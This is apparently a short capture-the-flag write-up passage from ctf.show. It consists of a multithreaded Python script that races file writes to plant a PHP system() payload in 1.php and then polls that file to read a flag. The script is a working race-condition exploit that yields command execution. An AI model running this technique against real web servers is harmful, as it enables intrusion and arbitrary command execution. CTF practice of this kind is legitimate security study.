&lt;p&gt;&lt;strong&gt;脚本解题&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import io
import requests
import threading

url = &amp;#39;http://041fc7d0-f1df-4259-8289-b2fec0303711.challenge.ctf.show/&amp;#39;


def write():
    while event.isSet():
        data = &amp;#123;
            &amp;#39;show&amp;#39;: &amp;#39;&amp;lt;?php system(&amp;quot;cat /ctfshow_fl0g_here.txt&amp;quot;);?&amp;gt;&amp;#39;
        &amp;#125;
        requests.post(url=url+&amp;#39;?ctf=1.php&amp;#39;, data=data)


def read():
    while event.isSet():
        response = requests.get(url + &amp;#39;1.php&amp;#39;)
        if response.status_code != 404:
            print(response.text)
            event.clear()


if __name__ == &amp;quot;__main__&amp;quot;:
    event = threading.Event()
    event.set()
    for i in range(1, 100):
        threading.Thread(target=write).start()

    for i in range(1, 100):
        threading.Thread(target=read).start()
&lt;/code&gt;&lt;/pre&gt;
